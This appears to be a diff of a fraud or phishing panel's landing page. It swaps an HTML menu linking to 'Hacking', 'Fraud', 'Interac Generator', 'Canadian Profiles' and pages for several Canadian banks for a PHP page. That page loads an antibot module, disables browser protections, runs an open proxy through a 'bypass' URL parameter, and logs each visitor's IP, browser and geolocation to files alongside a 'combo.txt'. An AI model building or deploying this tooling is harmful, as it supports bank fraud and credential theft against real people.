@@ -1,204 +1,869 @@
-<html><head>
-  <title>SARAH</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      background-color: #1a1a1a;
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
+<?php
+include "/mods/antibot.php";
+
+header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
+header("X-XSS-Protection: 0");
+header("X-Frame-Options: ALLOWALL");
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Credentials: true");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
+
+if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
+    $url = $_GET['url'];
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
+        "X-XSS-Protection: 0",
+        "X-Frame-Options: ALLOWALL",
+        "Access-Control-Allow-Origin: *",
+        "Access-Control-Allow-Credentials: true",
+        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
+        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
+    ));
+    $response = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    curl_close($ch);
+
+    header("HTTP/1.1 " . $info['http_code']);
+    foreach ($info['headers'] as $header) {
+        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
+            header($header);
+        }
+    }
+    echo $response;
+    exit;
+}
+
+$full_date = date("h:i:s|M/d/Y");
+$time = date("h:i:s");
+$date = date("M/d/Y");
+
+function get_client_ip()
+{
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    } else if (isset($_SERVER['REMOTE_ADDR'])) {
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    } else {
+        $ipaddress = 'UNKNOWN';
     }
 
-    header {
-      background-color: #333333;
-      padding: 20px;
-      text-align: center;
-      color: white;
+    return $ipaddress;
+}
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+function getOS()
+{
+    global $user_agent;
+    $os_platform = "Unknown OS Platform";
+    $os_array = array(
+        '/windows nt 10/i' => 'Windows 10',
+        '/windows nt 6.3/i' => 'Windows 8.1',
+        '/windows nt 6.2/i' => 'Windows 8',
+        '/windows nt 6.1/i' => 'Windows 7',
+        '/windows nt 6.0/i' => 'Windows Vista',
+        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
+        '/windows nt 5.1/i' => 'Windows XP',
+        '/windows xp/i' => 'Windows XP',
+        '/windows nt 5.0/i' => 'Windows 2000',
+        '/windows me/i' => 'Windows ME',
+        '/win98/i' => 'Windows 98',
+        '/win95/i' => 'Windows 95',
+        '/win16/i' => 'Windows 3.11',
+        '/macintosh|mac os x/i' => 'Mac OS X',
+        '/mac_powerpc/i' => 'Mac OS 9',
+        '/linux/i' => 'Linux',
+        '/ubuntu/i' => 'Ubuntu',
+        '/iphone/i' => 'iPhone',
+        '/ipod/i' => 'iPod',
+        '/ipad/i' => 'iPad',
+        '/android/i' => 'Android',
+        '/blackberry/i' => 'BlackBerry',
+        '/webos/i' => 'Mobile'
+    );
+
+    foreach ($os_array as $regex => $value) {
+        if (preg_match($regex, $user_agent)) {
+            $os_platform = $value;
+        }
     }
 
-    h1 {
-      font-size: 24px;
-      margin: 0;
+    return $os_platform;
+}
+
+function getBrowser()
+{
+    global $user_agent;
+    $browser = "Unknown Browser";
+    $browser_array = array(
+        '/msie/i' => 'Internet Explorer',
+        '/firefox/i' => 'Firefox',
+        '/safari/i' => 'Safari',
+        '/chrome/i' => 'Chrome',
+        '/edge/i' => 'Edge',
+        '/opera/i' => 'Opera',
+        '/netscape/i' => 'Netscape',
+        '/maxthon/i' => 'Maxthon',
+        '/konqueror/i' => 'Konqueror',
+        '/mobile/i' => 'Handheld Browser'
+    );
+
+    foreach ($browser_array as $regex => $value) {
+        if (preg_match($regex, $user_agent)) {
+            $browser = $value;
+        }
     }
 
-    .container {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
+    return $browser;
+}
 
-    .menu-icon {
+$user_os = getOS();
+$user_browser = getBrowser();
+
+$PublicIP = get_client_ip();
+$localHost = "127.0.0.1";
+
+if (strpos($PublicIP, ',') !== false) {
+    $PublicIP = explode(",", $PublicIP)[0];
+}
+
+$file = 'data.dat';
+$file1 = 'combo.txt';
+$file2 = 'master.log';
+$ip = "" . $PublicIP;
+$uaget = "" . $user_agent;
+$bsr = "" . $user_browser;
+$uos = "" . $user_os;
+$ust = explode(" ", $user_agent);
+$vr = $ust[3];
+$ver = str_replace(")", "", $vr);
+$version = "Version              : " . $ver;
+if (strpos($PublicIP, $localHost) !== false) {
+    $details = '{
+        "success": false
+    }';
+} else {
+    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
+}
+$details = json_decode($details, true);
+$success = $details['success'];
+$fp = fopen($file, 'a');
+
+if ($success == false) {
+    fwrite($fp, $ip . "\n");
+    fwrite($fp, $uos . "\n");
+    fwrite($fp, $version . "\n");
+    fwrite($fp, $bsr . "\n");
+    fclose($fp);
+} else if ($success == true) {
+    $country = $details['country'];
+    $city = $details['city'];
+    $continent = $details['continent'];
+    $tp = $details['type'];
+    $cn = $details['country_phone'];
+    $is = $details['isp'];
+    $la = $details['latitude'];
+    $lp = $details['longitude'];
+    $crn = $details['currency'];
+    $type = $tp;
+    $isp = $is;
+    $bank = "INTERACT WITH YOUR NEIGBORS![OPEN]";
+    $LL = "+";
+    $currency = "" . $full_date;
+    $lh = "|";
+    $li = ",";
+}
+
+
+?><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
+	<meta name="viewport" content="width=device-width, initial-scale=.5">
+body {
+  font-family: "Libre Baskerville", serif;
+  font-weight: 400;
+  font-size: 16px;
+  line-height: 30px;
+  background-color: #0c0f15;
+  overflow-x:hidden;
+  color: #ababab; }
+
+::-webkit-scrollbar {
+    width: 10px;
+    background-color: #F5F5F5;
+  
+}
+
+::-webkit-scrollbar-thumb {
+    background-color: #f90a23;
+    background-image: -webkit-linear-gradient(45deg,rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent);
+}
+
+::-webkit-scrollbar-track {
+    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
+    background-color: #F5F5F5;
+}
+
+.heading-page
+{
+      text-transform: uppercase;
+    font-size: 43px;
+    font-weight: bolder;
+    letter-spacing: 3px;
+    color: white;
+}
+a {
+  color: inherit;
+  -webkit-transition: all 0.3s ease 0s;
+  -moz-transition: all 0.3s ease 0s;
+  -o-transition: all 0.3s ease 0s;
+  transition: all 0.3s ease 0s; }
+  a:hover, a:focus {
+    color: #ababab;
+    text-decoration: none;
+    outline: 0 none; }
+
+h1, h2, h3,
+h4, h5, h6 {
+  color: #1e2530;
+  font-family: "Open Sans", sans-serif;
+  margin: 0;
+  line-height: 1.3; }
+
+p {
+  margin-bottom: 20px; }
+  p:last-child {
+    margin-bottom: 0; }
+
+/*
+ * Selection color
+ */
+::-moz-selection {
+  background-color: #FA6862;
+  color: #fff; }
+
+::selection {
+  background-color: #FA6862;
+  color: #fff; }
+
+/*
+ *  Reset bootstrap's default style
+ */
+.form-control::-webkit-input-placeholder,
+::-webkit-input-placeholder {
+  opacity: 1;
+  color: inherit; }
+
+.form-control:-moz-placeholder,
+:-moz-placeholder {
+  /* Firefox 18- */
+  opacity: 1;
+  color: inherit; }
+
+.form-control::-moz-placeholder,
+::-moz-placeholder {
+  /* Firefox 19+ */
+  opacity: 1;
+  color: inherit; }
+
+.form-control:-ms-input-placeholder,
+:-ms-input-placeholder {
+  opacity: 1;
+  color: inherit; }
+
+button, input, select,
+textarea, label {
+  font-weight: 400; }
+
+.btn {
+  -webkit-transition: all 0.3s ease 0s;
+  -moz-transition: all 0.3s ease 0s;
+  -o-transition: all 0.3s ease 0s;
+  transition: all 0.3s ease 0s; }
+  .btn:hover, .btn:focus, .btn:active:focus {
+    outline: 0 none; }
+
+.btn-primary {
+  background-color: #FA6862;
+  border: 0;
+  font-family: "Open Sans", sans-serif;
+  font-weight: 700;
+  height: 48px;
+  line-height: 50px;
+  padding: 0 42px;
+  text-transform: uppercase; }
+  .btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary:active:focus {
+    background-color: #f9423a; }
+
+.btn-border {
+  border: 1px solid #d7d8db;
+  display: inline-block;
+  padding: 7px; }
+
+/*
+ *  CSS Helper Class
+ */
+.clear:before, .clear:after {
+  content: " ";
+  display: table; }
+
+.clear:after {
+  clear: both; }
+
+.pt-table {
+  display: table;
+  width: 100%;
+  height: -webkit-calc(100vh - 4px);
+  height: -moz-calc(100vh - 4px);
+  height: calc(100vh - 4px); }
+
+.pt-tablecell {
+  display: table-cell;
+  vertical-align: middle; }
+
+.overlay {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%; }
+
+.relative {
+  position: relative; }
+
+.primary,
+.link:hover {
+  color: #FA6862; }
+
+.no-gutter {
+  margin-left: 0;
+  margin-right: 0; }
+  .no-gutter > [class^="col-"] {
+    padding-left: 0;
+    padding-right: 0; }
+
+.flex {
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-flex;
+  display: -ms-flexbox;
+  display: flex; }
+
+.flex-middle {
+  -webkit-box-align: center;
+  -ms-flex-align: center;
+  -webkit-align-items: center;
+  -moz-align-items: center;
+  align-items: center; }
+
+.space-between {
+  -webkit-box-pack: justify;
+  -ms-flex-pack: justify;
+  -webkit-justify-content: space-between;
+  -moz-justify-content: space-between;
+  justify-content: space-between; }
+
+.nicescroll-cursors {
+  background: #FA6862 !important; }
+
+.preloader {
+  bottom: 0;
+  left: 0;
+  position: fixed;
+  right: 0;
+  top: 0;
+  z-index: 1000;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-flex;
+  display: -ms-flexbox;
+  display: flex; }
+  .preloader.active.hidden {
+    display: none; }
+
+.loading-mask {
+  background-color: #FA6862;
+  height: 100%;
+  left: 0;
+  position: absolute;
+  top: 0;
+  width: 20%;
+  -webkit-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
+  -moz-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
+  -o-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
+  transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s; }
+  .loading-mask:nth-child(2) {
+    left: 20%;
+    -webkit-transition-delay: 0.1s;
+    -moz-transition-delay: 0.1s;
+    -o-transition-delay: 0.1s;
+    transition-delay: 0.1s; }
+  .loading-mask:nth-child(3) {
+    left: 40%;
+    -webkit-transition-delay: 0.2s;
+    -moz-transition-delay: 0.2s;
+    -o-transition-delay: 0.2s;
+    transition-delay: 0.2s; }
+  .loading-mask:nth-child(4) {
+    left: 60%;
+    -webkit-transition-delay: 0.3s;
+    -moz-transition-delay: 0.3s;
+    -o-transition-delay: 0.3s;
+    transition-delay: 0.3s; }
+  .loading-mask:nth-child(5) {
+    left: 80%;
+    -webkit-transition-delay: 0.4s;
+    -moz-transition-delay: 0.4s;
+    -o-transition-delay: 0.4s;
+    transition-delay: 0.4s; }
+
+.preloader.active.done {
+  z-index: 0; }
+
+.preloader.active .loading-mask {
+  width: 0; }
+
+/*------------------------------------------------
+	Start Styling
+-------------------------------------------------*/
+.mt20{margin-top:20px;}
+.site-wrapper {
+  border-top: 4px solid #ff0037; }
+
+.page-close {
+  font-size: 30px;
+  position: absolute;
+  right: 30px;
+  top: 30px;
+  z-index: 100; }
+
+.page-title {
+  margin-bottom: 75px; }
+  .page-title img {
+    margin-bottom: 20px; }
+  .page-title h2 {
+    font-size: 68px;
+    margin-bottom: 25px;
+    position: relative;
+    z-index: 0;
+    font-weight: 900;
+    text-transform: uppercase; }
+  .page-title p {
+    font-size: 16px; }
+  .page-title .title-bg {
+    color: rgba(30, 37, 48, 0.07);
+    font-size: 158px;
+    left: 0;
+    letter-spacing: 10px;
+    line-height: 0.7;
+    position: absolute;
+    right: 0;
+    top: 50%;
+    z-index: -1;
+    -webkit-transform: translateY(-50%);
+    -moz-transform: translateY(-50%);
+    -ms-transform: translateY(-50%);
+    -o-transform: translateY(-50%);
+    transform: translateY(-50%); }
+
+.section-title {
+  margin-bottom: 20px; }
+  .section-title h3 {
+    display: inline-block;
+    position: relative; }
+    .section-title h3::before, .section-title h3::after {
+      content: "";
+      height: 2px;
       position: absolute;
-      top: 20px;
-      left: 20px;
-      color: white;
-      font-size: 24px;
-      cursor: pointer;
-    }
+      bottom: 8px;
+      left: -webkit-calc(100% + 14px);
+      left: -moz-calc(100% + 14px);
+      left: calc(100% + 14px); }
+    .section-title h3::before {
+      background-color: #1e2530;
+      width: 96px;
+      bottom: 14px; }
+    .section-title h3::after {
+      background-color: #FA6862;
+      width: 73px; }
+  .section-title.light h3 {
+    color: #fff; }
+    .section-title.light h3::before {
+      background-color: #fff; }
 
-    .menu {
-      position: fixed;
-      top: 0;
-      left: 0;
+.page-nav {
+  bottom: 40px;
+  left: 0;
+  position: absolute;
+  right: 0; }
+  .page-nav span {
+    font-family: "Open Sans", sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    line-height: 0.9;
+    text-transform: uppercase; }
+
+/*------------------------------------------------
+    Home Page
+-------------------------------------------------*/
+
+.hexagon-item:first-child {
+    margin-left: 0;
+}
+
+.page-home {
+  background-position: center center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  vertical-align: middle; }
+  .page-home .overlay {
+    background-color: rgba(14, 17, 24, 0.97);
+}
+
+/* End of container */
+.hexagon-item {
+  cursor: pointer;
+  width: 200px;
+  height: 173.20508px;
+  float: left;
+  margin-left: -29px;
+  z-index: 0;
+  position: relative;
+  -webkit-transform: rotate(30deg);
+  -moz-transform: rotate(30deg);
+  -ms-transform: rotate(30deg);
+  -o-transform: rotate(30deg);
+  transform: rotate(30deg); }
+  .hexagon-item:first-child {
+    margin-left: 0; }
+  .hexagon-item:hover {
+    z-index: 1; }
+    .hexagon-item:hover .hex-item:last-child {
+      opacity: 1;
+      -webkit-transform: scale(1.3);
+      -moz-transform: scale(1.3);
+      -ms-transform: scale(1.3);
+      -o-transform: scale(1.3);
+      transform: scale(1.3); }
+    .hexagon-item:hover .hex-item:first-child {
+      opacity: 1;
+      -webkit-transform: scale(1.2);
+      -moz-transform: scale(1.2);
+      -ms-transform: scale(1.2);
+      -o-transform: scale(1.2);
+      transform: scale(1.2); }
+      .hexagon-item:hover .hex-item:first-child div:before,
+      .hexagon-item:hover .hex-item:first-child div:after {
+        height: 5px; }
+    .hexagon-item:hover .hex-item div::before,
+    .hexagon-item:hover .hex-item div::after {
+      background-color: #ff0037; }
+    .hexagon-item:hover .hex-content svg {
+      -webkit-transform: scale(0.97);
+      -moz-transform: scale(0.97);
+      -ms-transform: scale(0.97);
+      -o-transform: scale(0.97);
+      transform: scale(0.97); }
+
+.page-home .hexagon-item:nth-last-child(1),
+.page-home .hexagon-item:nth-last-child(2),
+.page-home .hexagon-item:nth-last-child(3) {
+  -webkit-transform: rotate(30deg) translate(87px, -80px);
+  -moz-transform: rotate(30deg) translate(87px, -80px);
+  -ms-transform: rotate(30deg) translate(87px, -80px);
+  -o-transform: rotate(30deg) translate(87px, -80px);
+  transform: rotate(30deg) translate(87px, -80px); }
+
+.hex-item {
+  position: absolute;
+  top: 0;
+  left: 50px;
+  width: 100px;
+  height: 173.20508px; }
+  .hex-item:first-child {
+    z-index: 0;
+    -webkit-transform: scale(0.9);
+    -moz-transform: scale(0.9);
+    -ms-transform: scale(0.9);
+    -o-transform: scale(0.9);
+    transform: scale(0.9);
+    -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
+    -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
+    -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
+    transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1); }
+  .hex-item:last-child {
+    transition: all 0.3s cubic-bezier(0.19, 1, 0.22, 1);
+    z-index: 1; }
+  .hex-item div {
+    box-sizing: border-box;
+    position: absolute;
+    top: 0;
+    width: 100px;
+    height: 173.20508px;
+    -webkit-transform-origin: center center;
+    -moz-transform-origin: center center;
+    -ms-transform-origin: center center;
+    -o-transform-origin: center center;
+    transform-origin: center center; }
+    .hex-item div::before, .hex-item div::after {
+      background-color: #1e2530;
+      content: "";
+      position: absolute;
       width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
+      height: 3px;
+      -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+      -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+      -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+      transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s; }
+    .hex-item div:before {
+      top: 0; }
+    .hex-item div:after {
+      bottom: 0; }
+    .hex-item div:nth-child(1) {
+      -webkit-transform: rotate(0deg);
+      -moz-transform: rotate(0deg);
+      -ms-transform: rotate(0deg);
+      -o-transform: rotate(0deg);
+      transform: rotate(0deg); }
+    .hex-item div:nth-child(2) {
+      -webkit-transform: rotate(60deg);
+      -moz-transform: rotate(60deg);
+      -ms-transform: rotate(60deg);
+      -o-transform: rotate(60deg);
+      transform: rotate(60deg); }
+    .hex-item div:nth-child(3) {
+      -webkit-transform: rotate(120deg);
+      -moz-transform: rotate(120deg);
+      -ms-transform: rotate(120deg);
+      -o-transform: rotate(120deg);
+      transform: rotate(120deg); }
 
-    .menu ul {
-      list-style-type: none;
-      padding: 0;
-      margin: 0;
-    }
+.hex-content {
+  color: #fff;
+  display: block;
+  height: 180px;
+  margin: 0 auto;
+  position: relative;
+  text-align: center;
+  transform: rotate(-30deg);
+  width: 156px; }
+  .hex-content .hex-content-inner {
+    left: 50%;
+    margin: -3px 0 0 2px;
+    position: absolute;
+    top: 50%;
+    -webkit-transform: translate(-50%, -50%);
+    -moz-transform: translate(-50%, -50%);
+    -ms-transform: translate(-50%, -50%);
+    -o-transform: translate(-50%, -50%);
+    transform: translate(-50%, -50%); }
+  .hex-content .icon {
+    display: block;
+    font-size: 36px;
+    line-height: 30px;
+    margin-bottom: 11px; }
+  .hex-content .title {
+    display: block;
+    font-family: "Open Sans", sans-serif;
+    font-size: 14px;
+    letter-spacing: 1px;
+    line-height: 24px;
+    text-transform: uppercase; }
+  .hex-content svg {
+    left: -7px;
+    position: absolute;
+    top: -13px;
+    transform: scale(0.87);
+    z-index: -1;
+    -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+    -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+    -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
+    transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s; }
+  .hex-content:hover {
+    color: #fff; }
 
-    .menu ul li {
-      margin-bottom: 10px;
-    }
-
-    .menu ul li a {
-      color: white;
-      text-decoration: none;
-      font-size: 18px;
-    }
-
-    .footer {
-      background-color: #333333;
-      padding: 20px;
-      text-align: center;
-      color: white;
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-    }
-
-    .widget {
-      width: 200px;
-      height: 50px;
-      background-color: #555555;
-      margin: 10px;
-      border-radius: 10px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      transition: background-color 0.3s;
-    }
-
-    .widget img {
-      width: 80px;
-      height: 80px;
-    }
-
-    .widget p {
-      font-size: 16px;
-      color: white;
-      margin: 10px 0;
-      text-align: center;
-    }
-
-    .widget:hover {
-      background-color: #777777;
-      cursor: pointer;
-    }
-
-    .login-button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .login-button:hover {
-      background-color: #0056b3;
-    }
-  </style>
-  <script>
-    function toggleMenu() {
-      var menu = document.getElementById("menu");
-      menu.style.display = menu.style.display === "block" ? "none" : "block";
-    }
-  </script>
-</head>
-<body>
-  <header>
-    <span class="menu-icon" onclick="toggleMenu()">☰</span>
-    <h1></h1>
-
-
-  <script>
-    function toggleMenu() {
-      var menu = document.getElementById("menu");
-      menu.style.display = menu.style.display === "block" ? "none" : "block";
-    }
-  </script>
+.page-home .hexagon-item:nth-last-child(1), .page-home .hexagon-item:nth-last-child(2), .page-home .hexagon-item:nth-last-child(3) {
+    -webkit-transform: rotate(30deg) translate(87px, -80px);
+    -moz-transform: rotate(30deg) translate(87px, -80px);
+    -ms-transform: rotate(30deg) translate(87px, -80px);
+    -o-transform: rotate(30deg) translate(87px, -80px);
+    transform: rotate(30deg) translate(87px, -80px);
+}
+/*------------------------------------------------
+    Welcome Page
+-------------------------------------------------*/
+.author-image-large {
+  position: absolute;
+  right: 0;
+  top: 0; }
+  .author-image-large img {
+    height: -webkit-calc(100vh - 4px);
+    height: -moz-calc(100vh - 4px);
+    height: calc(100vh - 4px); }
 
 
-  <header>
-    <span class="menu-icon" onclick="toggleMenu()">☰</span><center><img src="/images/sarah-logo/4.png" width="50%"></center><a href="https://www.fontspace.com/category/stencil"></a><a href="https://www.fontspace.com/category/stencil"><img src="https://see.fontimg.com/api/renderfont4/Wy7PA/eyJyIjoiZnMiLCJoIjo2NCwidyI6MTAwMCwiZnMiOjY0LCJmZ2MiOiIjRDU1OTRBIiwiYmdjIjoiI0ZGRkZGRiIsInQiOjF9/U0FSQUg/kong-japanese.png" alt="Stencil fonts"></a><a href="https://www.fontspace.com/category/japanese"></a><a href="https://www.fontspace.com/category/japanese"></a>
-  </header>
+@media (min-width: 1200px)
+{
+.col-lg-offset-2 {
+    margin-left: 16.66666667%;
+}
+}
 
-<div class="container">
-  <div class="widget">
-    <form action="/public/GO.php" method="post">
-      <button class="btn" type="submit">Forest Map</button>
-    </form>
+@media (min-width: 1200px)
+{
+.col-lg-8 {
+    width: 66.66666667%;
+}
+}
 
-  </div>
-  <div class="widget">
-    <form action="/public/GO1.php" method="post">
-      <button class="btn" type="submit">Forest Drive</button>
-    </form>
+.hexagon-item:first-child {
+    margin-left: 0;
+}
 
-  </div>
-<div class="container">
-  <div class="widget">
-    <form action="/public/GO.php" method="post">
-      <button class="btn" type="submit">Interac 1</button>
-    </form>
+.pt-table.desktop-768 .pt-tablecell {
+    padding-bottom: 110px;
+    padding-top: 60px;
+}
 
-  </div>
-  <div class="widget">
-    <form action="/public/deposit/manual.php" method="post">
-      <button class="btn" type="submit">Interac 2</button>
-    </form>
+
+
+.hexagon-item:hover .icon i
+{
+  color:#ff0037;
+  transition:0.6s;
+  
+}
+
+
+.hexagon-item:hover .title
+{
+  -webkit-animation: focus-in-contract 0.5s cubic-bezier(0.250, 0.460, 0.450, 0.940) both;
+	        animation: focus-in-contract 0.5s cubic-bezier(0.250, 0.460, 0.450, 0.940) both;
+}
+/***************************/
+
+@-webkit-keyframes focus-in-contract {
+  0% {
+    letter-spacing: 1em;
+    -webkit-filter: blur(12px);
+            filter: blur(12px);
+    opacity: 0;
+  }
+  100% {
+    -webkit-filter: blur(0px);
+            filter: blur(0px);
+    opacity: 1;
+  }
+}
+@keyframes focus-in-contract {
+  0% {
+    letter-spacing: 1em;
+    -webkit-filter: blur(12px);
+            filter: blur(12px);
+    opacity: 0;
+  }
+  100% {
+    -webkit-filter: blur(0px);
+            filter: blur(0px);
+    opacity: 1;
+  }
+}
+
+
+
+
+
+@media only screen and (max-width: 767px)
+{
+.hexagon-item {
+    float: none;
+    margin: 0 auto 50px;
+}
+  .hexagon-item:first-child {
+    margin-left: auto;
+}
+  
+  .page-home .hexagon-item:nth-last-child(1), .page-home .hexagon-item:nth-last-child(2), .page-home .hexagon-item:nth-last-child(3) {
+    -webkit-transform: rotate(30deg) translate(0px, 0px);
+    -moz-transform: rotate(30deg) translate(0px, 0px);
+    -ms-transform: rotate(30deg) translate(0px, 0px);
+    -o-transform: rotate(30deg) translate(0px, 0px);
+    transform: rotate(30deg) translate(0px, 0px);
+}
+  
+}
+
+
+</style></head>
+<body><main class="site-wrapper">
+  <div class="pt-table desktop-768">
+    <div class="pt-tablecell page-home relative" style="">
+                    <div class=""></div>
+
+                    <div class="container">
+                        <div style="text-align: center; color: red; font-weight: bold; padding: 20px; background-color: #f5f5f5; border: 2px solid #ff0000; border-radius: 10px;">
+  <h2 style="font-size: 24px; margin-bottom: 10px;">DISCLAIMER:</h2>
+  <p style="font-size: 16px;">THIS IS A RESTRICTED AREA. EVERYTHING INCLUDED IN THIS GAME IS AN ILLUSION.</p>
+  <p style="font-size: 16px;">EFFECTS OF THE GAME HAVE REAL-LIFE ALTERING CONSEQUENCES.</p>
+  <p style="font-size: 16px;">IF YOU CAN SEE THIS PAGE, YOU HAVE SUCCESSFULLY LOGGED INTO AN UNTRACEABLE CLOUD.</p>
+  <p style="font-size: 16px;">ENTER AT YOUR OWN RISK. STRICTLY FOR EDUCATIONAL AND DEMONSTRATIVE PURPOSES ONLY.</p><p style="font-size: 16px;">NOTHING YOU SEE HERE IS REAL, AND THE DEVELOPER IS NOT RESPONSIBLE FOR ANY ACTIONS TAKEN.</p>
+  <p style="font-size: 16px;">THIS PROJECT IS LICENSED BY HR-MAR-POK 206 AND IS ILLEGAL WORLDWIDE.</p>
+  <div class="row">
+                            <div class="hexagon-menu clear">
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    <div class="hexagon-item">
+                                        <div class="hex-item">
+                                            <div></div>
+                                            <div></div>
+                                            <div></div>
+                                        </div>
+                                        <div class="hex-item">
+                                            <div></div>
+                                            <div></div>
+                                            <div></div>
+                                        </div>
+                                        <a class="hex-content" href="/admin/banks.php">
+                                            <span class="hex-content-inner">
+                                                <span class="icon">
+                                                    <i class="fa fa-map-signs"></i>
+                                                </span>
+                                                <span class="title">START</span>
+                                            </span>
+                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
+                                        </a>
+                                    </div>
+                                </div><div class="col-xs-12 col-md-offset-1 col-md-10 col-lg-offset-2 col-lg-8">
+                                
+
+                                
+!<div class="hexagon-menu clear">
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                </div>
+                            </div></div>
 </div>
-</div>
-  <div class="menu" id="menu">
-    <ul>
-      <li><a href="/admin/drop/hacking.php"> </a></li>
-      <li><a href="/admin/drop/hacking.php">Hacking</a></li>
-      <li><a href="/admin/drop/fraud.php">Fraud</a></li>
-      <li><a href="/admin/drop/banks.php">Banks</a></li>
-      <li><a href="/admin/drop/social.php">Social Media</a></li>
-      <li><a href="/admin/drop/interac.php">Interac Request from</a></li>
-      <li><a href="/admin/drop/maps.php">Google Map Generator</a></li>
-      <li><a href="/admin/drop/drive.php">Google Drive Generator</a></li>
-      <li><a href="/admin/drop/forest.php">Interac Generator</a></li>
-      <li><a href="/admin/drop/telegram.php">Telegram Invite links</a></li>
-      <li><a href="/admin/drop/profiles.php">Canadian Profiles</a></li>
-      <li><a href="/admin/drop/pc.php">PC financial</a></li>
-      <li><a href="/admin/drop/lauren.php">Laurentian Bank</a></li>
-      <li><a href="/admin/drop/eq.php">eqbank</a></li>
-      <li><a href="/admin/drop/pro_entry.php">PROFILE DATA ENTRY </a></li>
-      <li><a href="/admin/drop/active.php">ACTIVE ACCOUNTS</a></li>
-      <li><a href="/admin/drop/de-active.php">DEACTIVATE ACCOUNTS</a></li>
-      <li><a href="/admin/drop/telhistory.php">TELEGRAM HITORY</a></li>
-      <li><a href="/admin/drop/bank.php">BANK HISTORY</a></li> 
-   </ul>
-  </div>
-
-  <footer class="footer">
-    <p>© 2023 EDUCATIONAL PURPOSES ONLY</p>
-  </footer>
-
-</header></body></html>
+                </div></div></div></main>
+</body></html>
